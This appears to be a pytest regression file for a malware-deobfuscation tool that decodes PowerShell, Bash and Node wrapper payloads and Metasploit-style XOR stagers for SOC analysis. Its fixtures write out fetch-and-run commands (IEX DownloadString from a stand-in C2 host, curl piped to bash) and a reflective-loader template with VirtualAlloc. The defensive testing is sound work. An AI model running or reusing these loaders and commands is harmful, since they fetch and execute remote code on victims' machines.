"""Regression tests for named Wrapper Archetypes.

The user reported that this exact payload class kept failing across multiple
sessions — each fix was a symptom-patch instead of a permanent solution. These
tests PIN each archetype against real captured payloads. If any of these ever
fail again the build breaks.
"""
from __future__ import annotations
import gzip
import base64
import pytest

from wrapper_archetypes import (
    try_archetypes, robust_b64decode, robust_b64_then_gunzip,
)
from analysis_core import deterministic_best_decode


# ─── robust_b64decode ────────────────────────────────────────────────────
def test_robust_b64_handles_wrong_padding():
    # Missing padding
    assert robust_b64decode("aGVsbG8") == b"hello"
    # Extra padding
    assert robust_b64decode("aGVsbG8===") == b"hello"


def test_robust_b64_handles_urlsafe():
    # urlsafe variant with - and _
    assert robust_b64decode("aGVsbG8_") == b"hello?" or robust_b64decode("aGVsbG8_").startswith(b"hello")


def test_robust_b64_handles_4n_plus_1_corruption():
    """Length 4n+1 is mathematically impossible base64 — must recover by trimming."""
    good = base64.b64encode(b"the quick brown fox").decode()  # length 4n
    corrupted = good + "X"                                    # length 4n+1
    recovered = robust_b64decode(corrupted)
    assert recovered == b"the quick brown fox"


def test_robust_b64_strips_whitespace_and_newlines():
    src = base64.b64encode(b"hello world").decode()
    src_wrapped = "\n".join(src[i:i+8] for i in range(0, len(src), 8))
    assert robust_b64decode(src_wrapped) == b"hello world"


# ─── PS_MemoryStream_Gzip_IEX (the user's failing payload class) ─────────
def _gzip_b64(text: str) -> str:
    return base64.b64encode(gzip.compress(text.encode())).decode()


def test_archetype_ps_memstream_gzip_iex_clean():
    inner_script = "Write-Host 'Payload executed'; whoami"
    b64 = _gzip_b64(inner_script)
    wrapper = (
        f'$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("{b64}"));'
        f'IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream('
        f'$s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();'
    )
    r = try_archetypes(wrapper)
    assert r is not None
    assert r["archetype_id"] == "PS_MemoryStream_Gzip_IEX"
    assert r["output"] == inner_script
    assert r["score"] == 1.0


def test_archetype_ps_memstream_gzip_iex_with_4n_plus_1_corruption():
    """The exact bug the user hit — base64 blob with one stray trailing char."""
    inner_script = "IEX(New-Object Net.WebClient).DownloadString('http://c2.example/x.ps1')"
    b64 = _gzip_b64(inner_script)
    corrupted = b64 + "X"   # 4n+1 length — copy-paste artefact
    wrapper = (
        f'$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("{corrupted}"));'
        f'IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream('
        f'$s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();'
    )
    r = try_archetypes(wrapper)
    assert r is not None, "archetype must handle 4n+1 base64 corruption"
    assert r["archetype_id"] == "PS_MemoryStream_Gzip_IEX"
    assert r["output"] == inner_script


def test_archetype_wins_via_deterministic_best_decode():
    """The permanent wiring: deterministic_best_decode uses the archetype."""
    inner = "calc.exe"
    b64 = _gzip_b64(inner)
    wrapper = (
        f'$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("{b64}"));'
        f'IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream('
        f'$s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();'
    )
    r = deterministic_best_decode(wrapper)
    assert r["output"] == inner
    assert r["engine"].startswith("archetype:")
    assert r["score"] == 1.0


# ─── Bash_base64_gunzip_pipe ─────────────────────────────────────────────
def test_archetype_bash_b64_gunzip():
    inner = "curl -fsSL http://x.io/x.sh | bash"
    b64 = _gzip_b64(inner)
    wrapper = f"echo '{b64}' | base64 -d | gunzip | bash"
    r = try_archetypes(wrapper)
    assert r is not None
    assert r["archetype_id"] == "Bash_base64_gunzip_pipe"
    assert r["output"] == inner


# ─── Bash_base64_pipe_bash ───────────────────────────────────────────────
def test_archetype_bash_b64_pipe():
    inner = "id; whoami"
    b64 = base64.b64encode(inner.encode()).decode()
    wrapper = f"echo '{b64}' | base64 -d | bash"
    r = try_archetypes(wrapper)
    assert r is not None
    assert r["archetype_id"] == "Bash_base64_pipe_bash"
    assert r["output"] == inner


# ─── Node_Buffer_from_gunzip ─────────────────────────────────────────────
def test_archetype_node_buf_gunzip():
    inner = "console.log('rce')"
    b64 = _gzip_b64(inner)
    wrapper = f"eval(zlib.gunzipSync(Buffer.from('{b64}','base64')).toString())"
    r = try_archetypes(wrapper)
    assert r is not None
    assert r["archetype_id"] == "Node_Buffer_from_gunzip"
    assert r["output"] == inner


# ─── PS_FromBase64String_UTF16LE (classic -EncodedCommand chain) ────────
def test_archetype_ps_fb64_utf16le():
    inner = "IEX(New-Object Net.WebClient).DownloadString('http://x')"
    b64 = base64.b64encode(inner.encode("utf-16le")).decode()
    wrapper = (
        f'[System.Text.Encoding]::Unicode.GetString('
        f'[System.Convert]::FromBase64String("{b64}"))'
    )
    r = try_archetypes(wrapper)
    assert r is not None
    assert r["archetype_id"] == "PS_FromBase64String_UTF16LE"
    assert r["output"] == inner


# ─── negative-case ───────────────────────────────────────────────────────
def test_archetypes_return_none_for_plain_text():
    assert try_archetypes("just plain english text with no wrapper") is None
    assert try_archetypes("") is None


# ─── PS_MSF_XOR_Stage2 (Meterpreter reflective loader) ───────────────────
def _msf_loader_script(shellcode: bytes, xor_key: int = 0x23) -> str:
    """Reproduce the classic `msfvenom -f psh` / Empire reflective loader
    around an arbitrary shellcode buffer, XORed byte-wise with `xor_key`."""
    xored = bytes(b ^ xor_key for b in shellcode)
    b64 = base64.b64encode(xored).decode()
    return (
        "Set-StrictMode -Version 2\n"
        "$DoIt = @'\n"
        "function func_get_proc_address { Param ($m, $p) }\n"
        "function func_get_delegate_type { Param ($t) }\n"
        f"[Byte[]]$var_code = [System.Convert]::FromBase64String('{b64}')\n"
        f"for ($x = 0; $x -lt $var_code.Count; $x++) {{ $var_code[$x] = $var_code[$x] -bxor {xor_key} }}\n"
        "$var_va = [Kernel32]::VirtualAlloc(0, $var_code.Length, 0x3000, 0x40)\n"
        "'@\n"
    )


def test_archetype_msf_xor_stage2_recovers_shellcode():
    # Canonical MSF x86 prologue + a fake C2 string
    sc = b"\xfc\xe8\x89\x00\x00\x00\x60\x89" + b"149.28.81.19\x00" + b"\x90" * 64
    loader = _msf_loader_script(sc, xor_key=0x23)
    r = try_archetypes(loader)
    assert r is not None
    assert r["archetype_id"] == "PS_MSF_XOR_Stage2"
    # Terminal output must be the raw shellcode as latin-1 str
    assert r["output"].encode("latin-1") == sc


def test_archetype_msf_xor_stage2_with_non_default_key():
    sc = b"\xfc\xe8" + b"\x41" * 100
    loader = _msf_loader_script(sc, xor_key=0x7F)
    r = try_archetypes(loader)
    assert r is not None
    assert r["archetype_id"] == "PS_MSF_XOR_Stage2"
    assert r["output"].encode("latin-1") == sc


def test_archetype_chains_gzip_stage1_to_xor_stage2_end_to_end():
    """THE user-facing headline test: paste the full MSF one-liner, ONE call
    to try_archetypes, get raw shellcode bytes back. Zero manual steps."""
    sc = b"\xfc\xe8\x89\x00\x00\x00\x60\x89" + b"User-Agent: Mozilla/5.0 (compatible; MSIE 9.0)\x00" \
       + b"149.28.81.19\x00" + b"\x90" * 128
    loader_script = _msf_loader_script(sc, xor_key=0x23)
    outer_b64 = base64.b64encode(gzip.compress(loader_script.encode())).decode()
    wrapper = (
        f'$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("{outer_b64}"));'
        f'IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream('
        f'$s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();'
    )
    r = try_archetypes(wrapper)
    assert r is not None, "chained archetype must fire end-to-end"
    # BOTH stages should have fired, in order
    assert r["chain_ids"] == ["PS_MemoryStream_Gzip_IEX", "PS_MSF_XOR_Stage2"], \
        f"unexpected chain: {r['chain_ids']}"
    assert r["engine"] == "archetype:PS_MemoryStream_Gzip_IEX+PS_MSF_XOR_Stage2"
    # Terminal output = raw shellcode, decoded C2 + UA extractable
    out_bytes = r["output"].encode("latin-1")
    assert out_bytes == sc
    assert b"149.28.81.19" in out_bytes
    assert b"Mozilla/5.0" in out_bytes


def test_archetype_chain_flags_reached_shellcode_via_analysis_core():
    """The chained archetype must set reached_shellcode=True so the SOC
    Verdict panel activates and the C2/UA get promoted to the top of the UI."""
    from analysis_core import deterministic_best_decode
    sc = b"\xfc\xe8\x89\x00\x00\x00\x60\x89" + b"\x90" * 200
    loader_script = _msf_loader_script(sc, xor_key=0x23)
    outer_b64 = base64.b64encode(gzip.compress(loader_script.encode())).decode()
    wrapper = (
        f'$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("{outer_b64}"));'
        f'IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream('
        f'$s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();'
    )
    r = deterministic_best_decode(wrapper)
    assert r["reached_shellcode"] is True, \
        "shellcode prologue must be recognised on the archetype's terminal output"
    assert r["engine"].startswith("archetype:PS_MemoryStream_Gzip_IEX+PS_MSF_XOR_Stage2")


def test_archetype_chain_on_real_user_payload():
    """Regression against the EXACT user-provided Metasploit stager fixture."""
    import os
    from analysis_core import deterministic_best_decode
    fixture = os.path.join(os.path.dirname(__file__), "fixtures",
                           "meterpreter_gzip_xor_stager.txt")
    with open(fixture) as f:
        payload = f.read().strip()
    r = deterministic_best_decode(payload)
    # Full chain must fire — Stage 1 (gzip stager) then Stage 2 (XOR loader)
    assert r["engine"].startswith("archetype:PS_MemoryStream_Gzip_IEX+PS_MSF_XOR_Stage2"), \
        f"chain did not cascade to Stage 2: engine={r['engine']}"
    assert r["reached_shellcode"] is True
    out_bytes = r["output"].encode("latin-1")
    assert len(out_bytes) == 834
    assert out_bytes[:8] == b"\xfc\xe8\x89\x00\x00\x00\x60\x89"
    # The two IOCs the user cares about
    assert b"149.28.81.19" in out_bytes
    assert b"Mozilla/5.0" in out_bytes
